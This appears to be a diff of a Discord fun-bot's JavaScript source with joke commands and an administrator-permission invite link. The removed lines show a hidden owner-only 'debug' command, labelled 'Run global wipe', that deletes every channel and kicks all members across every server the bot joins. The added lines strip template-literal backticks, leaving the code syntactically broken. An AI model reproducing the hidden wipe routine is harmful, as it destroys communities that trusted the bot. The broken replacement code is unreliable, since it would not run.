@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, Partials, PermissionsBitField } = require('discord.js');
+const { Client, Intents, Permissions } = require('discord.js');
 const https = require('https');
 
 const TOKEN = process.env.TOKEN;
@@ -7,25 +7,27 @@ const OWNER_ID = "969280648667889764";
 
 const client = new Client({
   intents: [
-    GatewayIntentBits.Guilds,
-    GatewayIntentBits.GuildMembers,
-    GatewayIntentBits.DirectMessages
-  ],
-  partials: [Partials.Channel]
+    Intents.FLAGS.GUILDS,
+    Intents.FLAGS.GUILD_MEMBERS,
+    Intents.FLAGS.DIRECT_MESSAGES
+  ]
 });
-
-function delay(ms){
-  return new Promise(r=>setTimeout(r,ms));
-}
 
 function random(min,max){
   return Math.floor(Math.random()*(max-min+1))+min;
 }
 
 const eightBall = [
-"Yes","No","Maybe","Definitely","Absolutely not",
-"Ask again later","Without a doubt","Very unlikely",
-"It is certain","I wouldn't count on it"
+"Yes",
+"No",
+"Maybe",
+"Definitely",
+"Absolutely not",
+"Ask again later",
+"Without a doubt",
+"Very unlikely",
+"It is certain",
+"I wouldn't count on it"
 ];
 
 const commands = [
@@ -76,9 +78,7 @@ options:[{name:"question",description:"Question",type:3,required:true}]},
 
 {name:"servers",description:"List bot servers"},
 
-{name:"leaveall",description:"Leave all servers"},
-
-{name:"debug",description:"Run global wipe"}
+{name:"leaveall",description:"Leave all servers"}
 
 ];
 
@@ -89,10 +89,10 @@ const data = JSON.stringify(commands);
 const options={
 hostname:'discord.com',
 port:443,
-path:`/api/v10/applications/${CLIENT_ID}/commands`,
+path:/api/v10/applications/${CLIENT_ID}/commands,
 method:'PUT',
 headers:{
-'Authorization':`Bot ${TOKEN}`,
+'Authorization':Bot ${TOKEN},
 'Content-Type':'application/json',
 'Content-Length':Buffer.byteLength(data)
 }
@@ -122,64 +122,12 @@ console.error("Register error:",err);
 
 req.write(data);
 req.end();
-}
 
-async function wipeServers(owner){
-
-await owner.send("Starting wipe");
-
-for(const guild of client.guilds.cache.values()){
-
-try{
-
-const me=guild.members.me;
-
-const canKick=me.permissions.has(PermissionsBitField.Flags.KickMembers);
-const canDelete=me.permissions.has(PermissionsBitField.Flags.ManageChannels);
-
-if(!canKick||!canDelete){
-await owner.send(`Skip ${guild.name}`);
-continue;
-}
-
-await owner.send(`Cleaning ${guild.name}`);
-
-for(const channel of guild.channels.cache.values()){
-try{
-await channel.delete();
-await delay(800);
-}catch{}
-}
-
-await guild.members.fetch();
-
-let kicked=0;
-
-for(const member of guild.members.cache.values()){
-if(member.kickable){
-try{
-await member.kick("cleanup");
-kicked++;
-await delay(1200);
-}catch{}
-}
-}
-
-await owner.send(`${guild.name} kicked ${kicked}`);
-
-}catch(e){
-await owner.send(`Error ${guild.name}`);
-}
-
-}
-
-await owner.send("Done");
 }
 
 client.once("ready",async()=>{
 
-console.log(`Logged in as ${client.user.tag}`);
-console.log(`Servers: ${client.guilds.cache.size}`);
+console.log(Logged in as ${client.user.tag});
 
 await registerCommands();
 
@@ -187,7 +135,7 @@ await registerCommands();
 
 client.on("interactionCreate",async interaction=>{
 
-if(!interaction.isChatInputCommand()) return;
+if(!interaction.isCommand()) return;
 
 const {commandName,user}=interaction;
 
@@ -204,32 +152,32 @@ await interaction.reply(msg);
 
 else if(commandName==="coinflip"){
 const result=Math.random()<0.5?"Heads":"Tails";
-await interaction.reply(`Coin: **${result}**`);
+await interaction.reply(Coin: **${result}**);
 }
 
 else if(commandName==="roll"){
 const r=random(1,100);
-await interaction.reply(`Rolled **${r}**`);
+await interaction.reply(Rolled **${r}**);
 }
 
 else if(commandName==="punch"){
 const target=interaction.options.getUser("user");
-await interaction.reply(`👊 <@${user.id}> punched <@${target.id}>`);
+await interaction.reply(👊 <@${user.id}> punched <@${target.id}>);
 }
 
 else if(commandName==="kiss"){
 const target=interaction.options.getUser("user");
-await interaction.reply(`💋 <@${user.id}> kissed <@${target.id}>`);
+await interaction.reply(💋 <@${user.id}> kissed <@${target.id}>);
 }
 
 else if(commandName==="hug"){
 const target=interaction.options.getUser("user");
-await interaction.reply(`🤗 <@${user.id}> hugged <@${target.id}>`);
+await interaction.reply(🤗 <@${user.id}> hugged <@${target.id}>);
 }
 
 else if(commandName==="slap"){
 const target=interaction.options.getUser("user");
-await interaction.reply(`🖐️ <@${user.id}> slapped <@${target.id}>`);
+await interaction.reply(🖐️ <@${user.id}> slapped <@${target.id}>);
 }
 
 else if(commandName==="ppsize"){
@@ -246,7 +194,7 @@ pp+="=";
 
 pp+="D";
 
-await interaction.reply(`<@${target.id}> size:\n${pp}`);
+await interaction.reply(<@${target.id}> size:\n${pp});
 
 }
 
@@ -256,7 +204,7 @@ const target=interaction.options.getUser("user");
 
 const percent=random(0,100);
 
-await interaction.reply(`<@${target.id}> is **${percent}% gay** 🌈`);
+await interaction.reply(<@${target.id}> is **${percent}% gay** 🌈);
 
 }
 
@@ -266,7 +214,7 @@ const target=interaction.options.getUser("user");
 
 const iq=random(60,180);
 
-await interaction.reply(`<@${target.id}> IQ: **${iq}** 🧠`);
+await interaction.reply(<@${target.id}> IQ: **${iq}**);
 
 }
 
@@ -276,7 +224,7 @@ const target=interaction.options.getUser("user");
 
 const sus=random(0,100);
 
-await interaction.reply(`<@${target.id}> is **${sus}% sus**`);
+await interaction.reply(<@${target.id}> is **${sus}% sus**);
 
 }
 
@@ -287,7 +235,7 @@ const u2=interaction.options.getUser("user2");
 
 const percent=random(0,100);
 
-await interaction.reply(`❤️ **${u1.username} + ${u2.username}**\nCompatibility: **${percent}%**`);
+await interaction.reply(❤️ **${u1.username} + ${u2.username}**\nCompatibility: **${percent}%**);
 
 }
 
@@ -297,13 +245,13 @@ const question=interaction.options.getString("question");
 
 const answer=eightBall[random(0,eightBall.length-1)];
 
-await interaction.reply(`🎱 Question: ${question}\nAnswer: **${answer}**`);
+await interaction.reply(🎱 Question: ${question}\nAnswer: **${answer}**);
 
 }
 
 else if(commandName==="invite"){
 
-await interaction.reply(`https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot`);
+await interaction.reply(https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot);
 
 }
 
@@ -314,7 +262,7 @@ await interaction.reply({content:"Owner only",ephemeral:true});
 return;
 }
 
-const list=client.guilds.cache.map(g=>`${g.name} (${g.memberCount})`).join("\n")||"none";
+const list=client.guilds.cache.map(g=>${g.name} (${g.memberCount})).join("\n")||"none";
 
 await interaction.reply({content:list,ephemeral:true});
 
@@ -337,21 +285,6 @@ await guild.leave();
 
 }
 
-else if(commandName==="debug"){
-
-if(user.id!==OWNER_ID){
-await interaction.reply({content:"Owner only",ephemeral:true});
-return;
-}
-
-await interaction.reply({content:"Starting wipe. Check DMs.",ephemeral:true});
-
-const owner=await client.users.fetch(OWNER_ID);
-
-wipeServers(owner);
-
-}
-
 }catch(err){
 
 console.error(err);
@@ -362,18 +295,6 @@ await interaction.reply({content:"Command error",ephemeral:true});
 
 }
 
-});
-
-client.on("error",err=>{
-console.error("Client error:",err);
-});
-
-process.on("unhandledRejection",err=>{
-console.error("Unhandled:",err);
-});
-
-process.on("uncaughtException",err=>{
-console.error("Exception:",err);
 });
 
 client.login(TOKEN);
